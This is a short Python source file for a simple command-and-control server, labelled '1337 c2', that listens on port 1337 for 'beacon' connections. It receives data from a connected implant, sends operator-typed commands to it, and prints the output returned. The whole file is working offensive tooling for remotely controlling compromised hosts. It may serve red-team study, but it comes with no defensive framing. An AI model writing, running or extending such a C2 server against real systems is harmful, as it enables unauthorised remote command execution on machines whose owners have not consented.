from signal import signal, SIGINT
from sys import exit
import socket
import time

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
print("Socket successfully created")

port = 1337

s.bind(('', port))
print("Socket bound to %s" % (port))

s.listen(5)
print("Socket is now listening")

def handler(signal_recieved, frame):
  print('\nQuitting 1337 c2...')
  s.close()
  exit(0)

def main():
  while True:
    print("Listening for beacon...")
    c, addr = s.accept()
    print("Beacon connected from:", addr)

    data_size = int(bytes.decode(c.recv(8).rstrip(b'\xfe')).strip('\x00'))
    # print(data_size)
    print("Size of data from beacon: " + str(data_size))
    print("Got data from beacon: " + bytes.decode(c.recv(data_size)))

    strToSend = input("> ")
    binCommand = strToSend.ljust(1024, '\0').encode("utf-8")
    # print("Len of binCommand: " + str(len(binCommand)))
    c.send(binCommand, len(binCommand))

    total_data = []
    begin = time.time()
    timeout = 2
    while 1:
      # print("waiting for data...")
      if total_data and time.time() - begin > timeout:
        break
      elif time.time() - begin > timeout * 2:
        break

      try:
        d_size = int(bytes.decode(c.recv(8).rstrip(b'\xfe')).strip('\x00'))
        data = c.recv(d_size)
        if data:
          # print(data)
          if bytes.decode(data) == 'eof':
            break
          total_data.append(bytes.decode(data))
          begin = time.time()
        else:
          time.sleep(0.1)
      except:
        pass
    
    output = ''.join(total_data)
    print(output)
    
    c.close()

if __name__ == "__main__":
  signal(SIGINT, handler)
  main()